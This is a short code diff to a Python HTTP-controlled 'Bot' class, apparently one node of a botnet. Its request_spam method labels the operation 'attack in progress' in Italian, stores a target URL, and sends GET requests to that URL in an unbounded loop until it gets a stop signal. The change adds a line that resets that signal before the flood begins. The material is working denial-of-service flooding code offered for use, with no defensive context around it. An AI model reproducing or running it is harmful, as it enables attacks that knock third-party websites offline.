@@ -139,6 +139,7 @@ class Bot(BaseHTTPRequestHandler):
     def request_spam(self, url, e):
         self.current_action['operation'] = 'Attacco in corso'
         self.current_action['targets'] = [url]
+        e.clear()
         while not e.is_set():
             res = requests.get(url)
             print(f"Request sent to {url} with status code {res.status_code}")
